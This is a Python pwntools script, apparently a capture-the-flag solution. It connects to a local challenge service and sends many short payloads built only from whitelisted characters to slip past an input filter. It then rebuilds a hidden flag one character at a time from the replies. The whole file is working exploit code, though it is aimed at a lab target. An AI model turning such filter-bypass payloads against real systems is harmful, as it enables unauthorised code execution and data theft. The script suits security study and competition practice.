from pwn import remote, context
from itertools import combinations_with_replacement

whitelist = r'&> !?+-*,%<^v~:=()01\'/|_#l$@r{};"'

chars = [ord(c) for c in whitelist]

comb_dict = {}

for k1, k2 in combinations_with_replacement(chars, 2):
    comb_dict[k1+k2] = [k1, k2, '+']
    comb_dict[k1-k2] = [k1, k2, '-']
    comb_dict[k2-k1] = [k2, k1, '-']
    comb_dict[k1] = [k1]

flag = '}'
io = remote('127.0.0.1', 35309)

for i in range(70):

    conf = comb_dict.get(i)

    # payload1 is for 2 * i
    if len(conf) == 1:
        char = chr(conf[0])
        if char == '"':
            quote = "'"
        else:
            quote = '"'
        payload1 = r"%s%s%s&>~& !- !1:! :! ?<~~" % (quote, char, quote)

    else:
        char1, char2, operator = conf
        char1, char2 = chr(char1), chr(char2)
        if char1 == '"' or char2 == '"':
            quote = "'"
        else:
            quote = '"'
        payload1 = r"%s%s%s%s%s&>~& !- !1:! :! ?<~~" % (quote, char1, char2, quote, operator)

    # payload2 is for 2 * i + 1
    payload2 = payload1 + '~'

    if i == 69:
        payloads = [payload1]
    else:
        payloads = [payload1, payload2]

    for pp in payloads:
        assert len(pp) <= 26
        io.sendlineafter(b'input your code:\n', pp.encode())
        res = io.recvline().decode().strip()
        flag += chr(int(res))

io.close()

flag = flag[::-1]
print(flag)
